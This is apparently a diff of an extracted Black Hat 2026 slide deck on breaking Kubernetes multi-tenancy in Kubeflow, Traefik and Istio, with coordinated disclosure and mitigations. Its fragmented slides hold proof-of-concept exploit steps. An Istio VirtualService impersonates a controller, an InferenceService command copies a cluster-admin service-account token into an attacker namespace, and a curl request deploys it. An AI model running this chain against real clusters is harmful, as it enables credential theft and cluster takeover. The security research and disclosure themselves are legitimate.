@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Lorin Lehawany&Sven Nobis_Breaking Multi-Tenancy Over and Over, and What We Can Learn From This.pdf"
 pages: 63
 sha256: "8d2ae7802cc2134ce86714c08d362309131b7fab0eaba4b0281b6344d8d412c6"
-text_chars: 16398
-ocr_pages: 6
+text_chars: 15951
+ocr_pages: 7
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 85.2
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 1
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:11:43Z"
+converted_at: "2026-08-12T05:37:03Z"
 ---
 # Breaking Multi-Tenancy Over and Over, and What We Can Learn From This
 
 **Speakers:** Lorin Lehawany, Sven Nobis  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Lorin Lehawany&Sven Nobis_Breaking Multi-Tenancy Over and Over, and What We Can Learn From This.pdf` (63 pages)
+
 
 ## Slide 1
 
@@ -120,10 +125,10 @@ What is Namespace
 -
 based Multi
 
-```
+\```
 o
 o
-```
+\```
 
 We found various ways to break
 
@@ -133,9 +138,9 @@ Tenancy
 
 Current security best practices
 
-```
+\```
 o
-```
+\```
 
 problems
 
@@ -147,10 +152,10 @@ in three projects
 
 Control plane layer
 
-```
+\```
 o
 o
-```
+\```
 
 Data plane layer
 
@@ -194,7 +199,7 @@ Namespace
 
 ns2
 
-```
+\```
 apiVersion:
 apiVersion: crd.example/v1
 crd.example/v1kind: SourceCRD
@@ -202,7 +207,7 @@ kind: TargetCRDspec:
 metadata:reference:
 name: examplename: example
 namespace: ns1
-```
+\```
 
 12
 
@@ -218,12 +223,10 @@ namespace: ns1
 
 14
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-USA
-2026
 @ Kubeflow Central Dashboa +
 kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker
 Kubeflow @ attacker (owner) ¥
@@ -233,7 +236,7 @@ Notebooks
 Last
 Status Name Created at Ima: Memory
 activity
-g attackers-n.. 32 minutes ago -  jupyter-scipy:... . 1.0 Gi CONNECT
+g attackers-n.. 32 minutes ago - jupyter-scipy:... . 1.0 Gi CONNECT
 Items per page: 10
 ```
 
@@ -243,12 +246,10 @@ Items per page: 10
 
 15
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-USA
-2026
 @ Kubeflow Central Dashboa +
 kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker
 a
@@ -279,21 +280,15 @@ CONNECT
 
 16
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-USA
-2026
-@ Kubeflow Central Dashboa se
-Cc 23 kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker
 + New Notebook
 ast
 Image Memory
 ivity
--  jupyter-scipy:... . 1.0Gi CONNECT
 Items per page
-simple ‘Guneher 0 QL
 ```
 
 ## Slide 17
@@ -303,17 +298,17 @@ Real
 
 World Scenario: Kubeflow
 
-```
+\```
 (base) jovyan@attackers-notebook-0:~$ kubectlauth whoami
 ATTRIBUTE   VALUE
 Username    system:serviceaccount:attacker:default-editor
 [...]
-```
+\```
 
-```
+\```
 (base) jovyan@attackers-notebook-0:~$ kubectlauth can-i\
 --list
-```
+\```
 
 17
 
@@ -380,7 +375,7 @@ Namespace
 
 ns2
 
-```
+\```
 apiVersion:
 apiVersion: crd.example/v1
 crd.example/v1kind: SourceCRD
@@ -388,7 +383,7 @@ kind: TargetCRDspec:
 metadata:reference:
 name: examplename: example
 namespace: ns1
-```
+\```
 
 21
 
@@ -417,7 +412,7 @@ attacker
 
 Exploit
 
-```
+\```
 apiVersion: networking.istio.io/v1beta1
 kind: VirtualService
 [...]
@@ -431,13 +426,13 @@ http:
 -uri:
 prefix: /assets/favicon.ico
 route:
-```
+\```
 
-```
+\```
 -destination:
 host: poc.attacker.svc.cluster.local
 [...]
-```
+\```
 
 Attacker
 
@@ -496,7 +491,7 @@ attacker
 
 User Impersonation
 
-```
+\```
 apiVersion: networking.istio.io/v1beta1
 kind: VirtualService
 [...]
@@ -507,21 +502,21 @@ http:
 -headers:
 request:
 set:
-```
+\```
 
 Attacker
 
-```
+\```
 kubeflow-userid: "system:serviceaccount:kubeflow:kserve-controller-manager"
 route:
-```
+\```
 
 - `destination:`
 
-```
+\```
 host: kserve-models-web-application.kubeflow.svc.cluster.local
 [...]
-```
+\```
 
 27
 
@@ -533,9 +528,9 @@ Full
 
 InferenceService
 
-```
+\```
 {
-```
+\```
 
 `"resources": [ { "apiVersion": "serving.kserve.io/v1beta1", "kind": "InferenceService",` Attacker `[...]` POST `"spec": {` /poc/kserve /api/ `"predictor": { "containers": [` namespaces /kubeflow / - `{` kserve resources `"command": [ "/bin/sh", "-c", "kubectl create secret -n attacker generic poccluster-admin-token --fromfile=/run/secrets/kubernetes.io/serviceaccount/token; sleep 60000" ], "serviceAccountName": "profiles-controller-service-account" [...]`
 
@@ -551,15 +546,25 @@ application
 
 ## Slide 29
 
+29
 1",
-
-```
 ttacker generic poc-
 token; sleep 60000"
 troller-service-account"
-```
-
-29
+Full Exploit : Deploy InferenceService
+kserve -
+models -
+web-
+application
+POST
+/poc/kserve /api/
+namespaces /kubeflow /
+kserve -resources
+Namespace
+kubeflow
+Deploy Resources
+Authorization Check:
+Attacker
 
 ## Slide 30
 
@@ -569,9 +574,9 @@ Full
 
 InferenceService
 
-```
+\```
 {
-```
+\```
 
 `"resources": [ { "apiVersion": "serving.kserve.io/v1beta1", "kind": "InferenceService",` Attacker `[...]` POST `"spec": {` /poc/kserve /api/ `"predictor": { "containers": [` namespaces /kubeflow / - `{` kserve resources `"command": [ "/bin/sh", "-c", "kubectl create secret -n attacker generic poccluster-admin-token --fromfile=/run/secrets/kubernetes.io/serviceaccount/token; sleep 60000" ], "serviceAccountName": "profiles-controller-service-account" [...]`
 
@@ -597,14 +602,14 @@ Demo Time!
 
 Attacker
 
-```
+\```
 (base) jovyan@attackers-notebook-0:~$ kubectlget secrets
 NAME                        TYPE     DATA   AGE
 (base) jovyan@attackers-notebook-0:~$ kubectlapply -f
 virtualservice-kserve.yaml
 virtualservice.networking.istio.io/kserve-controller-poc
 created
-```
+\```
 
 32
 
@@ -614,30 +619,30 @@ created
 
 Attacker
 
-```
+\```
 (base) jovyan@attackers-notebook-0:~$ curl "$DOMAIN/poc-
 vs/api/namespaces/kubeflow/kserve-resources" \
 -H 'accept:application/json, text/plain, */*' \
 -H 'content-type: application/json' \
-```
+\```
 
-```
+\```
 -b "$COOKIES" \
-```
+\```
 
-```
+\```
 -H "x-xsrf-token: $XSRF_TOKEN" \
 --data-binary @curl-kserve.json
-```
+\```
 
 - `[...]`
 
-```
+\```
 {"createdResources":[{"apiVersion":"serving.kserve.io/v1bet
 a1","kind":"InferenceService","name":"poc","namespace":"kub
 eflow"}],"message":"1 KServeresource(s) successfully
 created."}
-```
+\```
 
 ## Slide 34
 
@@ -645,7 +650,7 @@ created."}
 
 Attacker
 
-```
+\```
 (base) jovyan@attacker-nb-0:~$ kubectlget secret
 NAME                        TYPE     DATA   AGE
 poc-cluster-admin-token     Opaque   1      43s
@@ -656,7 +661,7 @@ kubeconfig.yamlauth can-i--list
 Resources   Non-Resource URLs   Resource Names   Verbs
 *.* [] []               [*]
 [*][]               [*]
-```
+\```
 
 34
 
@@ -720,11 +725,10 @@ Attacker
 
 39
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-2026
 ft < New notebook
 | (B= Notebooks
 . °
@@ -738,7 +742,6 @@ puting and
 hics
 Custom Notebook
 Custom Image
-europe-docker.pkg.dev/folkloric-stone-231516/ernw-images/snobis/poc-webserv:
 IfNotPresent
 ```
 
@@ -772,18 +775,18 @@ either
 
 logs the request to steal the cookie like before
 
-```
+\```
 o
-```
+\```
 
 -
 or executes client
 
 side code in Browser to perform actions on
 
-```
+\```
 o
-```
+\```
 
 behalf of the victim
 
@@ -797,37 +800,25 @@ Attacker
 
 41
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 74/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-USA
-2026
-F* Kubeflow Central Dashboa’ x [ESIRGSEYTe ae
-23 kubeflow.gke.gcp.ernw.eu/notebook/snobisernw-de-ext/test/
 DevTools - kubeflow.gke.gcp.ernw.eu/notebook/snobisernw-de-ext/test/
 ‘® [0 Elements Recorder Console Sources Network Performance Memory Application Privacyandsecurity Lighthouse AdBlock
-® @ Y. QA) G@Preservelog CO Disablecache Nothrotting ~ @ %
 Y Filter © Invert 1 Morefilters » All Fetch/XHR_ Doc CSS JS Font Img Media Manifest) WS Wasm | Other
-I -
-Name X_Headers Payload __ Preview __Response__Initiator__Timing__Cookies
 & test/
 style.css
 Request Payload view source
 y {statusCode: 200, header: {content-length: "386", content-type: "application/json; charset=utf-8",..
-& scripts body: "{\"user snobis #€XT#@ernwlab. onmicrosoft.com\",\"platform\":{\"kubeflowVersion\
 © page-scriptjs ~ header: {content-length: "386", content-type: "application/json; charset=utf-8",..}
-(config content-length:
 content-type: "applic n/ json rset=utf-8
 date: "Wed
 etag: "W/\"182-E4zxd7 v1c aPHk
 ©) log server:
-} env-info
 x-envoy-upstream-service-time
 x-powered-by:
 statusCode: 200
-dyn}
-\"unknown\y
 ```
 
 ## Slide 42
@@ -840,22 +831,33 @@ Partially affected
 
 42
 
+
+> Recovered by OCR — confidence 84/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+
+```text
+black hat I
+Kube
+Affected Partially affected
+M Azure vmware
+42
+```
+
 ## Slide 43
 
 Coordinated Disclosure
 
-```
+\```
 o
-```
+\```
 
-```
+\```
 o
-```
+\```
 
-```
+\```
 o
 o
-```
+\```
 
 43
 
@@ -871,9 +873,9 @@ fixed in Kubeflow by
 
 removing the Istio edit permissions from the Service
 
-```
+\```
 o
-```
+\```
 
 Account
 
@@ -933,11 +935,10 @@ ns1/target
 
 46
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-2026
 Real-World Scenario: Traefik
 46
 ```
@@ -961,7 +962,7 @@ Namespace
 
 victim
 
-```
+\```
 kind: ServersTransport
 apiVersion:
 traefik.io/v1alpha1
@@ -971,9 +972,9 @@ spec:
 certificatesSecrets:
 -client-cert-
 secret
-```
+\```
 
-```
+\```
 kind: Service
 apiVersion: v1
 metadata:
@@ -981,7 +982,7 @@ annotations:
 traefik.ingress.kubern
 etes.io/service.serverstra
 nsport: st@kubernetescrd: st@kubernetescrdst@kubernetescrd
-```
+\```
 
 nsport: st@kubernetescrd: st@kubernetescrdst@kubernetescrd
 What is the impact?
@@ -1037,12 +1038,12 @@ Coordinated Disclosure
 
 Issue is being fixed in Traefik.
 
-```
+\```
 o
 o
 o
 o
-```
+\```
 
 -
 Traefik updated their Multi
@@ -1121,19 +1122,19 @@ Coordinated Disclosure
 
 Istio maintainers consider this issue to be expected behavior
 
-```
+\```
 o
-```
+\```
 
 -
 Purposeful user experience trade
 
 off
 
-```
+\```
 o
 o
-```
+\```
 
 Recommendation:
 
@@ -1151,9 +1152,9 @@ Together with Istio, we published the Security Note
 
 -
 
-```
+\```
 o
-```
+\```
 
 -
 SECURITY
@@ -1169,9 +1170,9 @@ to address this issue.
 
 Thanks to the Istio project!
 
-```
+\```
 o
-```
+\```
 
 54
 
@@ -1220,13 +1221,13 @@ often
 
 access
 
-```
+\```
 o
-```
+\```
 
 Deploy different applications into the same cluster
 
-```
+\```
 o
 o
 o
@@ -1234,15 +1235,15 @@ o
 o
 o
 o
-```
+\```
 
 Typically, share a level of trust
 
 indirect
 
-```
+\```
 o
-```
+\```
 
 Machine learning
 
@@ -1300,14 +1301,14 @@ Usage of existing admission policy sets Definition of custom policies
 
 Admission Controls
 
-```
+\```
 gateways:
 'mesh'
 'victim/[...]'
 'allowed-gw'
-```
+\```
 
-```
+\```
 'victim/[...]'
 apiVersion: networking.istio.io/v1beta1
 kind: VirtualService'allowed-gw'
@@ -1322,7 +1323,7 @@ http:
 'example.com'
 -[...]
 'allowed-host.svc'
-```
+\```
 
 60
 
